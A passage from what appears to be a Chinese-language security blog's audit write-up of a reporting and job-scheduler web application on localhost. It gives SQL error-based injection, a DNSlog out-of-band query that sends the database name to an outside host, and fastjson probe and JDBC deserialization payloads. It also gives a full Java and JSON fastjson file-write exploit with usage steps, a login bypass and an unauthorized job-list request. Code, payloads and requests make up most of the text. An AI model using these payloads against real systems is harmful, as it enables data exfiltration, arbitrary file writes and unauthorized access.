+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> UPDATEXML(<span class="hljs-number">1</span>, CONCAT(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> (substr((<span class="hljs-keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="hljs-keyword">FROM</span> information_schema.TABLES <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>))), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240623112155505-1719145846392-97.png" srcset="/img/loading.gif" lazyload alt="image-20240623112155505"></p>
+<h4 id="dnslog外带："><a href="#dnslog外带：" class="headerlink" title="dnslog外带："></a>dnslog外带：</h4><p>除了使用报错注入，还可以使用dnslog外带，但是前提是<code>secure_file_priv</code>为空值，并且目标主机是出网的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240623112515391-1719145846392-98.png" srcset="/img/loading.gif" lazyload alt="image-20240623112515391"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;.srhckvkttj.dgrh3.cn\\123&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240623112819265-1719145846392-100.png" srcset="/img/loading.gif" lazyload alt="image-20240623112819265"></p>
+<h2 id="3-fastjson："><a href="#3-fastjson：" class="headerlink" title="3. fastjson："></a>3. fastjson：</h2><p>全局搜索<code>JSONObject</code>或者<code>JSON.parse()</code>等字样：</p>
+<p>随便找一个接口：</p>
+<p><img src="/../../blog_image/image-20240613114901626-1719145846392-102.png" srcset="/img/loading.gif" lazyload alt="image-20240613114901626"></p>
+<h3 id="3-1-尝试报错fastjson版本："><a href="#3-1-尝试报错fastjson版本：" class="headerlink" title="3.1 尝试报错fastjson版本："></a>3.1 尝试报错fastjson版本：</h3><p>通过报错判断当前版本失败：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240613115512539-1719145846392-101.png" srcset="/img/loading.gif" lazyload alt="image-20240613115512539"></p>
+<p>原因的json的读取的通过jackjson，之后才调用JSONObject，而且没有调用<code>JSONObject.parse</code>，因此这种的是不能恶意调用fastjson的。</p>
+<p>全局搜<code>JSON.parse()</code>，发现存在可控参数：</p>
+<p><img src="/../../blog_image/image-20240613130144605-1719145846392-103.png" srcset="/img/loading.gif" lazyload alt="image-20240613130144605"></p>
+<h3 id="3-2-dnslog探测："><a href="#3-2-dnslog探测：" class="headerlink" title="3.2 dnslog探测："></a>3.2 dnslog探测：</h3><p>updateCommonReport更新报表中，存在存在parse解析传入的元json数据，如图所示：</p>
+<p><img src="/../../blog_image/image-20240613131112876-1719145846392-104.png" srcset="/img/loading.gif" lazyload alt="image-20240613131112876"></p>
+<p>但是做了try catch处理，因此不能通过报错探测fastjson版本，但是可以dnslog：</p>
+<p><img src="/../../blog_image/image-20240613131220775-1719145846392-105.png" srcset="/img/loading.gif" lazyload alt="image-20240613131220775"></p>
+<p>poc如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/report/updateCommonReport</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081/<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a223864646366663361383066343138396361316339643464393032633363393039222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;, &quot;Google Chrome&quot;;v=&quot;126&quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>331<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;authorizedPeople&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;dataSource&quot;</span>: <span class="hljs-string">&quot;mysql&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;jobCron&quot;</span>: <span class="hljs-string">&quot;0 0 * * * ?&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;metaDataJson&quot;</span>: <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>java.net.Inet4Address<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>val<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>thekkafatm.dgrh3.cn<span class="hljs-subst">\&quot;</span>&#125;&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;reportDesc&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;reportFrequency&quot;</span>: <span class="hljs-string">&quot;按天&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;reportName&quot;</span>: <span class="hljs-string">&quot;new_test&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;sql&quot;</span>: <span class="hljs-string">&quot;select * from inteport.igreport_metadata;&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span></span><br><span class="language-swift">&#125;</span><br><span class="language-swift"></span><br></code></pre></td></tr></table></figure>
+
+<p>成功dnslog：</p>
+<p><img src="/../../blog_image/image-20240613131421425-1719145846392-106.png" srcset="/img/loading.gif" lazyload alt="image-20240613131421425"></p>
+<h3 id="3-3-尝试jdbc攻击（失败）："><a href="#3-3-尝试jdbc攻击（失败）：" class="headerlink" title="3.3 尝试jdbc攻击（失败）："></a>3.3 尝试jdbc攻击（失败）：</h3><p>本地启动一个evil-mysql-serve，如图所示：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">evil</span>-mysql-server.exe -addr <span class="hljs-number">3307</span> -ysoserial ysoserial.jar -java C:\Environment\java\<span class="hljs-number">8</span>u65\jdk1.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>_65\bin\java.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240613135050282-1719145846393-107.png" srcset="/img/loading.gif" lazyload alt="image-20240613135050282"></p>
+<p>具体payload，如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3307</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;yso_CommonsCollections5_calc&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;allowLoadLocalInfile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload不能换行：</p>
+<p><img src="/../../blog_image/image-20240613140243930-1719145846393-110.png" srcset="/img/loading.gif" lazyload alt="image-20240613140243930"></p>
+<p>失败原因：</p>
+<blockquote>
+<p>因为缺少cc依赖，如果存在cc依赖或者cb依赖就可以打，或者其他的反序列化入口即可。</p>
+</blockquote>
+<h3 id="3-4-jdk11无依赖写入文件（成功）："><a href="#3-4-jdk11无依赖写入文件（成功）：" class="headerlink" title="3.4 jdk11无依赖写入文件（成功）："></a>3.4 jdk11无依赖写入文件（成功）：</h3><p>最终找到了一个jdk11+<code>1.2.57&lt;=fastjson&lt;=1.2.68</code>的，无依赖写入文件：</p>
+<p>代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hme;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_WriteFile_JDK11</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> gzcompress(<span class="hljs-string">&quot;123456&quot;</span>);<br>        <span class="hljs-comment">//php -r &quot;echo base64_encode(gzcompress(&#x27;qwerasdf&#x27;));&quot;</span><br>        <span class="hljs-comment">//&lt;=1.2.68 and JDK11</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    \&quot;@type\&quot;:\&quot;sun.rmi.server.MarshalOutputStream\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    \&quot;out\&quot;:\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    &#123;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.util.zip.InflaterOutputStream\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        \&quot;out\&quot;:\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        &#123;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;           \&quot;@type\&quot;:\&quot;java.io.FileOutputStream\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;           \&quot;file\&quot;:\&quot;e:/bbb.txt\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;           \&quot;append\&quot;:false\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        &#125;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        \&quot;infl\&quot;:\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        &#123;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;            \&quot;input\&quot;:\r\n&quot;</span><br>               + <span class="hljs-string">&quot;            &#123;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;                \&quot;array\&quot;:\&quot;&quot;</span>+code+<span class="hljs-string">&quot;\&quot;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;                \&quot;limit\&quot;:12\r\n&quot;</span>  <span class="hljs-comment">//需对应修改</span><br>               + <span class="hljs-string">&quot;            &#125;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        &#125;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;        \&quot;bufLen\&quot;:1048576\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    &#125;,\r\n&quot;</span><br>               + <span class="hljs-string">&quot;    \&quot;protocolVersion\&quot;:1\r\n&quot;</span><br>               + <span class="hljs-string">&quot;&#125;\r\n&quot;</span><br>               + <span class="hljs-string">&quot;&quot;</span>;<br>        System.out.println(payload);<br>        JSON.parseObject(payload);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">gzcompress</span><span class="hljs-params">(String code)</span> &#123;<br>        <span class="hljs-type">byte</span>[] data = code.getBytes();<br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">compresser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        compresser.reset();<br>        compresser.setInput(data);<br>        compresser.finish();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(data.length);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> (!compresser.finished()) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> compresser.deflate(buf);<br>                bos.write(buf, <span class="hljs-number">0</span>, i);<br>            &#125;<br>            output = bos.toByteArray();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            output = data;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                bos.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        compresser.end();<br>        System.out.println(Arrays.toString(output));<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(output);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用方法如下：</p>
+<ol>
+<li>gzcompress填入的是我们写入的内容</li>
+<li>随后根据填入的内容修改limit，应该修改为当前输入长度的两倍</li>
+<li>第三点就是修改file字段，修改成我们需要写入文件的地址。</li>
+</ol>
+<p>注意payload不能换行：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;author&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;authorizedPeople&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dataSource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;mysql&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;jobCron&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0 0 * * * ?&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;metaDataJson&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;sun.rmi.server.MarshalOutputStream\&quot;, \&quot;out\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.zip.InflaterOutputStream\&quot;, \&quot;out\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.io.FileOutputStream\&quot;, \&quot;file\&quot;:\&quot;e:/bbb.txt\&quot;, \&quot;append\&quot;:false&#125;, \&quot;infl\&quot;: &#123;\&quot;input\&quot;: &#123;\&quot;array\&quot;:\&quot;eJx7snfB06V7ARBFBIk=\&quot;, \&quot;limit\&quot;:12&#125;\n&#125;, \&quot;bufLen\&quot;:1048576&#125;, \&quot;protocolVersion\&quot;:1&#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;reportDesc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;reportFrequency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;按天&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;reportName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;new_test&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;sql&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;select * from inteport.igreport_metadata;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>成功写入文件：</p>
+<p><img src="/../../blog_image/image-20240613161041701-1719145846393-108.png" srcset="/img/loading.gif" lazyload alt="image-20240613161041701"></p>
+<h2 id="4-越权："><a href="#4-越权：" class="headerlink" title="4. 越权："></a>4. 越权：</h2><h3 id="4-1-绕过登录校验："><a href="#4-1-绕过登录校验：" class="headerlink" title="4.1 绕过登录校验："></a>4.1 绕过登录校验：</h3><p>在登陆接口中随便输入密码，拦截相应包：</p>
+<p><img src="/../../blog_image/image-20240623172929370-1719145846393-109.png" srcset="/img/loading.gif" lazyload alt="image-20240623172929370"></p>
+<p>登录成功：</p>
+<p><img src="/../../blog_image/image-20240623173010340-1719145846393-111.png" srcset="/img/loading.gif" lazyload alt="image-20240623173010340"></p>
+<h3 id="4-2-越权查看任意用户定时任务："><a href="#4-2-越权查看任意用户定时任务：" class="headerlink" title="4.2 越权查看任意用户定时任务："></a>4.2 越权查看任意用户定时任务：</h3><p><img src="/../../blog_image/image-20240623191959272-1719145846393-112.png" srcset="/img/loading.gif" lazyload alt="image-20240623191959272"></p>
+<p>当前接口没有做权限校验，通过获取用户名即可查询对应用户的job列表：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/jobinfo/pageList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a342c22757365726e616d65223a2274657374222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a302c227065726d697373696f6e223a2231227d<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jobDesc&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;userName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageIndex&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;pageSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
